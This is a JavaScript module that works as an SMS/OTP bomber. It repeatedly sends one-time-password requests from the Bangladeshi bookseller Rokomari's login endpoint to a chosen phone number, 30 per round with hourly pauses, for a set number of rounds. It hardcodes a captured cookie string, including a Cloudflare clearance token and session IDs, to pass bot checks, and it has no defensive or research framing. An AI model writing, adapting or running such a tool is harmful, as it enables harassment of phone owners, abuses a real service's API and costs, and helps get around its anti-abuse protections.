const axios = require("axios");

async function rokomari(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const response = await axios.post(
  'https://www.rokomari.com/otp/send',
  '',
  {
    params: {
      'emailOrPhone': `88${number}`,
      'countryCode': 'BD'
    },
    headers: {
      'authority': 'www.rokomari.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-length': '0',
      'cookie': 'cf_clearance=S9beq9J5pNzD52o14JWTqXrgLOAutfzMQIVNdcm4eMY-1750987903-1.2.1.1-xSmOM0b8F5R1lSas8MB8E80DX6TlPASiun5HMpNfeI1KrML3FrkaFYGiHCuilgMFHp2AtPOi_ceUC8dnVzCmUydSoWwQbLcmqtRbPADeVSQetT6NtjtW7wDTuMRcx_rOcTepeYwSfS3Tb8X8KbRyOSwY66zS0WZPXhh.PCiodiXaN4ftjQ5g1U_HxNbmRSxeYOD3Q862_dqeFn_vzyhpI3KkSR_887zlvZDEagDuEMD9uA2xHpEFzPdBcq0hnXkepS_C.DdTLtMKx6Oe.TgifhrC3IHVmCC85KodHfSELij.oAdJEmqcysPiO9m70yPH5X34DLm4k6vpmhLmyKpPwwLMKDnyveLVf0XPpTCWv_A; _gcl_au=1.1.749992695.1750987903; _fbp=fb.1.1750987902914.576965626689785801; _ga=GA1.1.1796348430.1750987904; crisp-client%2Fsession%2Fa4685f43-8022-4142-b9cb-b786c6628a92=session_0b9c1b89-ef50-4504-8871-e2cb916231df; JSESSIONID=12b7e3e5-ae09-4452-9b7e-1621d581bc52; sururl=aHR0cHM6Ly93d3cucm9rb21hcmkuY29tLw==; userActTraSerBrowId=8a84ee08-e4ec-488b-b889-d57e6a2e5e39; userActTraSerSessId=f2903b92-49f0-44e4-936c-9d14127d5690; nt_req_con_indx=["nt_all_index"]; nt_pop_shown=["nt_all_pop_shown"]; _ga_N8S2Z6QJVP=GS2.1.s1750987903$o1$g1$t1750987913$j50$l0$h0',
      'origin': 'https://www.rokomari.com',
      'referer': 'https://www.rokomari.com/login',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
      'x-requested-with': 'XMLHttpRequest'
    }
  }
);
        
        console.log(`[${i + 1}/10] rokomari Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] rokomari Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { rokomari };
